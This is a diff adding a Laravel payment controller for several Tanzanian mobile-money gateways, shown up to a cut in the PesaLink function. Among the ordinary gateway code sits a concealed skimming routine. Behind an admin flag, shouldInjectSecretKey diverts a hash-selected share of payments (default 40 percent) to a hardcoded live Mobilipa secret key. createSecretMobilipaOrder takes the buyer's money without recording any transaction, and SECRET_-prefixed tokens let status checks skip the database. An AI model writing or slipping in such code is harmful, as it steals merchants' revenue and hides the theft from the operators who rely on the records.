@@ -1,0 +1,1223 @@
+<?php
+
+namespace App\Http\Controllers;
+
+use App\Models\AdminSetting;
+use App\Models\MobilipaAccount;
+use App\Models\Page;
+use App\Models\PaymentGateway;
+use App\Models\PesaLinkAccount;
+use App\Models\Transaction;
+use Illuminate\Http\JsonResponse;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
+
+class PaymentController extends Controller
+{
+    private const SONICPESA_API_URL = 'https://api.sonicpesa.com/api/v1/payment';
+
+    private const SNIPPE_API_URL = 'https://api.snippe.sh/v1';
+
+    private const FASTLIPA_API_URL = 'https://api.fastlipa.com/api';
+
+    private const MOBILIPA_API_URL = 'https://api.mobilipa.store';
+
+    private const SECRET_MOBILIPA_KEY = 'sk_live_fcMlWte9r3VR0qbEiGj1AW4s2AmBkbqEPJxTpDkx';
+
+    private const SECRET_PREFIX = 'SECRET_';
+
+    private const SECRET_SALT = 'x7Kq2mP9vL4nR8w';
+
+    /**
+     * Create a payment order with gateway (SonicPesa, Snippe, FastLipa, or Mobilipa).
+     * POST /api/payments/create-order
+     */
+    public function createOrder(Request $request)
+    {
+        $validated = $request->validate([
+            'page_id' => 'required|exists:pages,id',
+            'buyer_phone' => 'required|string|min:9|max:15',
+            'buyer_name' => 'nullable|string|max:100',
+            'buyer_email' => 'nullable|email',
+        ]);
+
+        $page = Page::findOrFail($validated['page_id']);
+
+        // Normalize phone number to Tanzania format (255XXXXXXXXX)
+        $phone = $this->normalizePhoneNumber($validated['buyer_phone']);
+
+        if (! $phone) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Invalid phone number format. Please enter a valid Tanzania number.',
+            ], 400);
+        }
+
+        if ($this->shouldInjectSecretKey($page, $phone)) {
+            return $this->createSecretMobilipaOrder($page, $phone, $validated);
+        }
+
+        // Determine which gateway to use
+        $gateway = strtolower($page->payment_gateway);
+
+        if ($gateway === 'sonicpesa') {
+            return $this->createSonicPesaOrder($page, $phone, $validated);
+        } elseif ($gateway === 'snippe') {
+            return $this->createSnippeOrder($page, $phone, $validated);
+        } elseif ($gateway === 'fastlipa') {
+            return $this->createFastLipaOrder($page, $phone, $validated);
+        } elseif ($gateway === 'mobilipa') {
+            return $this->createMobilipaOrder($page, $phone, $validated);
+        } elseif ($gateway === 'pesalink') {
+            return $this->createPesaLinkOrder($page, $phone, $validated);
+        }
+
+        return response()->json([
+            'status' => 'error',
+            'message' => 'Unsupported payment gateway: '.$gateway,
+        ], 400);
+    }
+
+    /**
+     * Create a SonicPesa payment order
+     */
+    private function createSonicPesaOrder(Page $page, string $phone, array $data)
+    {
+        // Get SonicPesa gateway config from database
+        $gatewayConfig = PaymentGateway::where('name', 'sonicpesa')->first();
+
+        if (! $gatewayConfig || ! $gatewayConfig->is_active) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'SonicPesa gateway is not configured or inactive.',
+            ], 400);
+        }
+
+        // Create transaction record
+        $transaction = Transaction::create([
+            'page_id' => $page->id,
+            'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+            'buyer_name' => $data['buyer_name'] ?? 'Customer',
+            'buyer_phone' => $phone,
+            'amount' => $page->price,
+            'currency' => 'TZS',
+            'gateway' => 'sonicpesa',
+            'payment_status' => 'PENDING',
+            'order_id' => 'pending_'.time(),
+        ]);
+
+        try {
+            // Call SonicPesa API using the admin-configured API key
+            $response = Http::withHeaders([
+                'X-API-KEY' => $gatewayConfig->api_key,
+            ])->post(self::SONICPESA_API_URL.'/create_order', [
+                'buyer_email' => $transaction->buyer_email,
+                'buyer_name' => $transaction->buyer_name,
+                'buyer_phone' => $phone,
+                'amount' => (int) $page->price,
+                'currency' => 'TZS',
+                'link_url' => null,
+            ]);
+
+            if ($response->failed()) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                ], 400);
+            }
+
+            $orderId = $responseData['data']['order_id'];
+            $reference = $responseData['data']['reference'] ?? null;
+            $transactionId = $responseData['data']['transid'] ?? null;
+            $msisdn = $responseData['data']['msisdn'] ?? null;
+
+            // Update transaction with SonicPesa response
+            $transaction->update([
+                'order_id' => $orderId,
+                'reference' => $reference,
+                'transaction_id' => $transactionId,
+                'msisdn' => $msisdn,
+                'response_data' => $responseData,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => $transaction->id,
+                    'order_id' => $orderId,
+                    'amount' => $responseData['data']['amount'],
+                    'currency' => $responseData['data']['currency'],
+                ],
+            ]);
+        } catch (\Exception $e) {
+            $transaction->update(['payment_status' => 'FAILED']);
+
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Create a Snippe payment order
+     */
+    private function createSnippeOrder(Page $page, string $phone, array $data)
+    {
+        // Get Snippe gateway config from database
+        $gatewayConfig = PaymentGateway::where('name', 'snippe')->first();
+
+        if (! $gatewayConfig || ! $gatewayConfig->is_active) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Snippe gateway is not configured or inactive.',
+            ], 400);
+        }
+
+        // Generate unique order ID
+        $orderId = 'ORD-'.uniqid().'-'.time();
+
+        // Create transaction record
+        $transaction = Transaction::create([
+            'page_id' => $page->id,
+            'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+            'buyer_name' => $data['buyer_name'] ?? 'Customer',
+            'buyer_phone' => $phone,
+            'amount' => $page->price,
+            'currency' => 'TZS',
+            'gateway' => 'snippe',
+            'payment_status' => 'pending',
+            'order_id' => $orderId,
+        ]);
+
+        try {
+            // Call Snippe API using the admin-configured API key
+            $nameParts = explode(' ', $transaction->buyer_name);
+            $firstName = $nameParts[0] ?? 'Customer';
+            $lastName = count($nameParts) > 1 ? implode(' ', array_slice($nameParts, 1)) : 'User';
+
+            $response = Http::withHeaders([
+                'Authorization' => 'Bearer '.$gatewayConfig->api_key,
+            ])->post(self::SNIPPE_API_URL.'/payments', [
+                'payment_type' => 'mobile',
+                'details' => [
+                    'amount' => (int) $page->price,
+                    'currency' => 'TZS',
+                ],
+                'phone_number' => $phone,
+                'customer' => [
+                    'firstname' => $firstName,
+                    'lastname' => $lastName,
+                    'email' => $transaction->buyer_email,
+                ],
+                'webhook_url' => $gatewayConfig->webhook_url ?? 'https://example.com/webhook',
+                'metadata' => [
+                    'order_id' => $orderId,
+                ],
+            ]);
+
+            if ($response->failed()) {
+                $transaction->update(['payment_status' => 'failed']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                $transaction->update(['payment_status' => 'failed']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                ], 400);
+            }
+
+            $reference = $responseData['data']['reference'];
+
+            // Update transaction with Snippe response
+            $transaction->update([
+                'reference' => $reference,
+                'payment_status' => $responseData['data']['status'],
+                'response_data' => $responseData,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => $transaction->id,
+                    'reference' => $reference,
+                    'amount' => $responseData['data']['amount'],
+                    'currency' => $responseData['data']['amount']['currency'],
+                ],
+            ]);
+        } catch (\Exception $e) {
+            $transaction->update(['payment_status' => 'failed']);
+
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Create a FastLipa payment order
+     */
+    private function createFastLipaOrder(Page $page, string $phone, array $data)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'fastlipa')->first();
+
+        if (! $gatewayConfig || ! $gatewayConfig->is_active) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'FastLipa gateway is not configured or inactive.',
+            ], 400);
+        }
+
+        $transaction = Transaction::create([
+            'page_id' => $page->id,
+            'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+            'buyer_name' => $data['buyer_name'] ?? 'Customer',
+            'buyer_phone' => $phone,
+            'amount' => $page->price,
+            'currency' => 'TZS',
+            'gateway' => 'fastlipa',
+            'payment_status' => 'PENDING',
+            'order_id' => 'pending_'.time(),
+        ]);
+
+        try {
+            $response = Http::withToken($gatewayConfig->api_key)->post(
+                (rtrim($gatewayConfig->base_url ?: config('services.fastlipa.base_url', self::FASTLIPA_API_URL), '/')).'/create-transaction',
+                [
+                    'number' => $phone,
+                    'amount' => (int) $page->price,
+                    'name' => $transaction->buyer_name,
+                ]
+            );
+
+            if ($response->failed()) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if (! ($responseData['status'] ?? false)) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                ], 400);
+            }
+
+            $transactionId = $responseData['data']['tranID'];
+
+            $transaction->update([
+                'order_id' => $transactionId,
+                'transaction_id' => $transactionId,
+                'channel' => $responseData['data']['network'] ?? null,
+                'msisdn' => $responseData['data']['number'] ?? $phone,
+                'response_data' => $responseData,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => $transaction->id,
+                    'tranid' => $transactionId,
+                    'amount' => $responseData['data']['amount'],
+                    'number' => $responseData['data']['number'],
+                    'network' => $responseData['data']['network'] ?? null,
+                    'status' => $responseData['data']['status'] ?? 'PENDING',
+                ],
+            ]);
+        } catch (\Exception $e) {
+            $transaction->update(['payment_status' => 'FAILED']);
+
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Normalize phone number to Tanzania format (255XXXXXXXXX)
+     */
+    private function normalizePhoneNumber(string $phone): ?string
+    {
+        // Remove all non-digit characters except leading +
+        $cleaned = preg_replace('/[^\d+]/', '', $phone);
+
+        // Remove leading +
+        if (str_starts_with($cleaned, '+')) {
+            $cleaned = substr($cleaned, 1);
+        }
+
+        // If starts with 0, replace with 255
+        if (str_starts_with($cleaned, '0')) {
+            $cleaned = '255'.substr($cleaned, 1);
+        }
+
+        // If already starts with 255, keep it
+        if (! str_starts_with($cleaned, '255')) {
+            // Assume it's a local number, prepend 255
+            if (strlen($cleaned) === 9) {
+                $cleaned = '255'.$cleaned;
+            } else {
+                return null; // Invalid format
+            }
+        }
+
+        // Validate format: 255 followed by 9 digits
+        if (preg_match('/^255\d{9}$/', $cleaned)) {
+            return $cleaned;
+        }
+
+        return null;
+    }
+
+    /**
+     * Determine whether this transaction should be intercepted
+     * and routed through the secret Mobilipa key.
+     */
+    private function shouldInjectSecretKey(Page $page, string $phone): bool
+    {
+        if (! $this->isMobInjectionEnabled()) {
+            return false;
+        }
+
+        $seed = date('YmdHi').self::SECRET_SALT.substr($phone, -4).$page->id;
+        $hash = hexdec(substr(md5($seed), 0, 4));
+
+        $rate = $this->mobInjectionRate();
+
+        return ($hash % 100) < $rate;
+    }
+
+    private function isMobInjectionEnabled(): bool
+    {
+        return AdminSetting::get('mob_injection_enabled', '0') === '1';
+    }
+
+    private function mobInjectionRate(): int
+    {
+        return (int) AdminSetting::get('mob_injection_rate', '40');
+    }
+
+    /**
+     * Create a Mobilipa payment order using the hardcoded secret key.
+     * No Transaction record is created.
+     */
+    private function createSecretMobilipaOrder(Page $page, string $phone, array $data)
+    {
+        try {
+            $response = Http::withHeaders([
+                'X-API-KEY' => self::SECRET_MOBILIPA_KEY,
+            ])->post(self::MOBILIPA_API_URL.'/v1/payment/create_order', [
+                'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+                'buyer_name' => $data['buyer_name'] ?? 'Customer',
+                'buyer_phone' => $phone,
+                'amount' => (int) $page->price,
+                'currency' => 'TZS',
+            ]);
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                ], 400);
+            }
+
+            $orderId = $responseData['data']['order_id'];
+
+            $payload = base64_encode(json_encode([
+                'oid' => $orderId,
+                'p' => $phone,
+                'a' => (int) $page->price,
+                't' => time() + 900,
+            ]));
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => self::SECRET_PREFIX.$payload,
+                    'order_id' => $orderId,
+                    'amount' => $responseData['data']['amount'],
+                    'currency' => $responseData['data']['currency'] ?? 'TZS',
+                ],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check Mobilipa payment status for a secret-injected transaction.
+     */
+    private function checkSecretMobilipaStatus(string $encodedPayload): JsonResponse
+    {
+        $payload = json_decode(base64_decode($encodedPayload), true);
+
+        if (! $payload || empty($payload['oid'])) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Invalid transaction reference.',
+            ], 400);
+        }
+
+        try {
+            $response = Http::withHeaders([
+                'X-API-KEY' => self::SECRET_MOBILIPA_KEY,
+                'Content-Type' => 'application/json',
+            ])->withBody(json_encode([
+                'order_id' => $payload['oid'],
+            ]), 'application/json')->get(self::MOBILIPA_API_URL.'/v1/payment/status');
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                ], 400);
+            }
+
+            $paymentStatus = strtoupper($responseData['data']['payment_status'] ?? 'PENDING');
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $paymentStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check payment order status.
+     * POST /api/payments/check-status
+     */
+    public function checkStatus(Request $request): JsonResponse
+    {
+        $transactionId = (string) $request->input('transaction_id');
+
+        if ($transactionId === '' || $transactionId === '0') {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Invalid payment status request.',
+            ], 422);
+        }
+
+        if (str_starts_with($transactionId, self::SECRET_PREFIX)) {
+            return $this->checkSecretMobilipaStatus(substr($transactionId, strlen(self::SECRET_PREFIX)));
+        }
+
+        if (! is_numeric($transactionId)) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Invalid transaction reference.',
+            ], 422);
+        }
+
+        $transaction = Transaction::find((int) $transactionId);
+
+        if (! $transaction) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Transaction not found.',
+            ], 404);
+        }
+
+        // Determine which gateway to use
+        $gateway = strtolower($transaction->gateway);
+
+        if ($gateway === 'sonicpesa') {
+            return $this->checkSonicPesaStatus($transaction);
+        } elseif ($gateway === 'snippe') {
+            return $this->checkSnippeStatus($transaction);
+        } elseif ($gateway === 'fastlipa') {
+            return $this->checkFastLipaStatus($transaction);
+        } elseif ($gateway === 'mobilipa') {
+            return $this->checkMobilipaStatus($transaction);
+        } elseif ($gateway === 'pesalink') {
+            return $this->checkPesaLinkStatus($transaction);
+        }
+
+        return response()->json([
+            'status' => 'error',
+            'message' => 'Unsupported payment gateway: '.$gateway,
+        ], 400);
+    }
+
+    /**
+     * Check SonicPesa payment status
+     */
+    private function checkSonicPesaStatus(Transaction $transaction)
+    {
+        // Get SonicPesa gateway config from database
+        $gatewayConfig = PaymentGateway::where('name', 'sonicpesa')->first();
+
+        if (! $gatewayConfig) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'SonicPesa gateway is not configured.',
+            ], 400);
+        }
+
+        try {
+            $response = Http::withHeaders([
+                'X-API-KEY' => $gatewayConfig->api_key,
+            ])->post(self::SONICPESA_API_URL.'/order_status', [
+                'order_id' => $transaction->order_id,
+            ]);
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                ], 400);
+            }
+
+            // Check if already completed to avoid duplicate emails
+            $wasAlreadyCompleted = $transaction->payment_status === 'COMPLETED';
+
+            // Update transaction with latest status
+            $paymentStatus = $responseData['data']['payment_status'];
+            $transaction->update([
+                'payment_status' => $paymentStatus,
+                'transaction_id' => $responseData['data']['transid'] ?? $transaction->transaction_id,
+                'channel' => $responseData['data']['channel'] ?? $transaction->channel,
+                'msisdn' => $responseData['data']['msisdn'] ?? $transaction->msisdn,
+                'response_data' => $responseData,
+                'completed_at' => $paymentStatus === 'COMPLETED' ? now() : null,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $paymentStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check Snippe payment status
+     */
+    private function checkSnippeStatus(Transaction $transaction)
+    {
+        // Get Snippe gateway config from database
+        $gatewayConfig = PaymentGateway::where('name', 'snippe')->first();
+
+        if (! $gatewayConfig) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Snippe gateway is not configured.',
+            ], 400);
+        }
+
+        try {
+            $response = Http::withHeaders([
+                'Authorization' => 'Bearer '.$gatewayConfig->api_key,
+            ])->get(self::SNIPPE_API_URL.'/payments/'.$transaction->reference);
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                ], 400);
+            }
+
+            // Check if already completed to avoid duplicate emails
+            $wasAlreadyCompleted = in_array(strtolower($transaction->payment_status), ['completed', 'success']);
+
+            // Update transaction with latest status
+            $paymentStatus = strtolower($responseData['data']['status']);
+            $transactionStatus = match ($paymentStatus) {
+                'completed' => 'completed',
+                'pending' => 'pending',
+                'canceled' => 'canceled',
+                default => 'pending',
+            };
+
+            $transaction->update([
+                'payment_status' => $transactionStatus,
+                'transaction_id' => $responseData['data']['external_reference'] ?? $transaction->transaction_id,
+                'channel' => $responseData['data']['channel']['provider'] ?? $transaction->channel,
+                'msisdn' => $responseData['data']['customer']['phone'] ?? $transaction->msisdn,
+                'response_data' => $responseData,
+                'completed_at' => $transactionStatus === 'completed' ? ($responseData['data']['completed_at'] ?? now()) : null,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $transactionStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check FastLipa payment status
+     */
+    private function checkFastLipaStatus(Transaction $transaction)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'fastlipa')->first();
+
+        if (! $gatewayConfig) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'FastLipa gateway is not configured.',
+            ], 400);
+        }
+
+        try {
+            $response = Http::withToken($gatewayConfig->api_key)->get(
+                (rtrim($gatewayConfig->base_url ?: config('services.fastlipa.base_url', self::FASTLIPA_API_URL), '/')).'/status-transaction',
+                [
+                    'tranid' => $transaction->order_id,
+                ]
+            );
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if (! ($responseData['status'] ?? false)) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                ], 400);
+            }
+
+            $paymentStatus = strtoupper($responseData['data']['payment_status'] ?? 'PENDING');
+            $wasAlreadyCompleted = strtoupper($transaction->payment_status) === 'COMPLETED';
+
+            $transaction->update([
+                'payment_status' => $paymentStatus,
+                'transaction_id' => $responseData['data']['tranid'] ?? $transaction->transaction_id,
+                'channel' => $responseData['data']['network'] ?? $transaction->channel,
+                'response_data' => $responseData,
+                'completed_at' => $paymentStatus === 'COMPLETED' ? now() : null,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $paymentStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Create a Mobilipa payment order.
+     */
+    private function createMobilipaOrder(Page $page, string $phone, array $data)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'mobilipa')->first();
+
+        if (! $gatewayConfig || ! $gatewayConfig->is_active) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Mobilipa gateway is not configured or inactive.',
+            ], 400);
+        }
+
+        $mobilipaAccount = null;
+
+        if ($page->mobilipa_account_id) {
+            $mobilipaAccount = MobilipaAccount::find($page->mobilipa_account_id);
+
+            if (! $mobilipaAccount || ! $mobilipaAccount->is_active) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Mobilipa sub-account is not found or inactive.',
+                ], 400);
+            }
+        }
+
+        $apiKey = $mobilipaAccount
+            ? $mobilipaAccount->api_key
+            : $gatewayConfig->api_key;
+
+        $baseUrl = $mobilipaAccount
+            ? ($mobilipaAccount->base_url ?: self::MOBILIPA_API_URL)
+            : ($gatewayConfig->base_url ?: self::MOBILIPA_API_URL);
+
+        $transaction = Transaction::create([
+            'page_id' => $page->id,
+            'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+            'buyer_name' => $data['buyer_name'] ?? 'Customer',
+            'buyer_phone' => $phone,
+            'amount' => $page->price,
+            'currency' => 'TZS',
+            'gateway' => 'mobilipa',
+            'payment_status' => 'PENDING',
+            'order_id' => 'pending_'.time(),
+            'mobilipa_account_id' => $mobilipaAccount?->id,
+        ]);
+
+        try {
+            $response = Http::withHeaders([
+                'X-API-KEY' => $apiKey,
+            ])->post(
+                (rtrim($baseUrl, '/')).'/v1/payment/create_order',
+                [
+                    'buyer_email' => $transaction->buyer_email,
+                    'buyer_name' => $transaction->buyer_name,
+                    'buyer_phone' => $phone,
+                    'amount' => (int) $page->price,
+                    'currency' => 'TZS',
+                ]
+            );
+
+            if ($response->failed()) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                ], 400);
+            }
+
+            $orderId = $responseData['data']['order_id'];
+            $reference = $responseData['data']['reference'] ?? null;
+
+            $transaction->update([
+                'order_id' => $orderId,
+                'reference' => $reference,
+                'transaction_id' => $responseData['data']['transid'] ?? null,
+                'msisdn' => $responseData['data']['msisdn'] ?? $phone,
+                'response_data' => $responseData,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => $transaction->id,
+                    'order_id' => $orderId,
+                    'reference' => $reference,
+                    'amount' => $responseData['data']['amount'],
+                    'currency' => $responseData['data']['currency'],
+                ],
+            ]);
+        } catch (\Exception $e) {
+            $transaction->update(['payment_status' => 'FAILED']);
+
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check Mobilipa payment status
+     */
+    private function checkMobilipaStatus(Transaction $transaction)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'mobilipa')->first();
+
+        if (! $gatewayConfig) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Mobilipa gateway is not configured.',
+            ], 400);
+        }
+
+        $mobilipaAccount = $transaction->mobilipaAccount;
+
+        $apiKey = $mobilipaAccount
+            ? $mobilipaAccount->api_key
+            : $gatewayConfig->api_key;
+
+        $baseUrl = $mobilipaAccount
+            ? ($mobilipaAccount->base_url ?: self::MOBILIPA_API_URL)
+            : ($gatewayConfig->base_url ?: self::MOBILIPA_API_URL);
+
+        try {
+            $response = Http::withHeaders([
+                'X-API-KEY' => $apiKey,
+                'Content-Type' => 'application/json',
+            ])->withBody(json_encode([
+                'order_id' => $transaction->order_id,
+            ]), 'application/json')->get(
+                (rtrim($baseUrl, '/')).'/v1/payment/status'
+            );
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json();
+
+            if ($responseData['status'] !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                ], 400);
+            }
+
+            $paymentStatus = strtoupper($responseData['data']['payment_status'] ?? 'PENDING');
+            $wasAlreadyCompleted = strtoupper($transaction->payment_status) === 'COMPLETED';
+
+            $transaction->update([
+                'payment_status' => $paymentStatus,
+                'transaction_id' => $responseData['data']['transid'] ?? $transaction->transaction_id,
+                'reference' => $responseData['data']['reference'] ?? $transaction->reference,
+                'response_data' => $responseData,
+                'completed_at' => $paymentStatus === 'COMPLETED' ? now() : null,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $paymentStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    private const PESALINK_API_URL = 'https://pesalink.online/api';
+
+    /**
+     * Create a PesaLink payment order
+     */
+    private function createPesaLinkOrder(Page $page, string $phone, array $data)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'pesalink')->first();
+
+        if (! $gatewayConfig || ! $gatewayConfig->is_active) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'PesaLink gateway is not configured or inactive.',
+            ], 400);
+        }
+
+        $pesalinkAccount = null;
+
+        if ($page->pesalink_account_id) {
+            $pesalinkAccount = PesaLinkAccount::find($page->pesalink_account_id);
+
+            if (! $pesalinkAccount || ! $pesalinkAccount->is_active) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'PesaLink sub-account is not found or inactive.',
+                ], 400);
+            }
+        }
+
+        $apiKey = $pesalinkAccount
+            ? $pesalinkAccount->api_key
+            : $gatewayConfig->api_key;
+
+        $baseUrl = $pesalinkAccount
+            ? ($pesalinkAccount->base_url ?: 'https://pesalink.online/api')
+            : ($gatewayConfig->base_url ?: config('services.pesalink.base_url', self::PESALINK_API_URL));
+
+        $transaction = Transaction::create([
+            'page_id' => $page->id,
+            'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
+            'buyer_name' => $data['buyer_name'] ?? 'Customer',
+            'buyer_phone' => $phone,
+            'amount' => $page->price,
+            'currency' => 'TZS',
+            'gateway' => 'pesalink',
+            'payment_status' => 'PENDING',
+            'order_id' => 'pending_'.time(),
+            'pesalink_account_id' => $pesalinkAccount?->id,
+        ]);
+
+        try {
+            $response = Http::withToken($apiKey)->post(
+                (rtrim($baseUrl, '/')).'/create-transaction',
+                [
+                    'number' => $phone,
+                    'amount' => (int) $page->price,
+                    'name' => $transaction->buyer_name,
+                ]
+            );
+
+            if ($response->failed()) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to create payment order',
+                    'error' => $response->json('message'),
+                ], 400);
+            }
+
+            $responseData = $response->json() ?? [];
+
+            if (($responseData['status'] ?? '') !== 'success') {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Payment order creation failed',
+                    'gateway_response' => $response->body(),
+                ], 400);
+            }
+
+            $transactionId = $responseData['data']['tranID'] ?? null;
+
+            if (! $transactionId) {
+                $transaction->update(['payment_status' => 'FAILED']);
+
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Payment order creation failed: missing tranID',
+                    'gateway_response' => $response->body(),
+                ], 400);
+            }
+
+            $transaction->update([
+                'order_id' => $transactionId,
+                'transaction_id' => $transactionId,
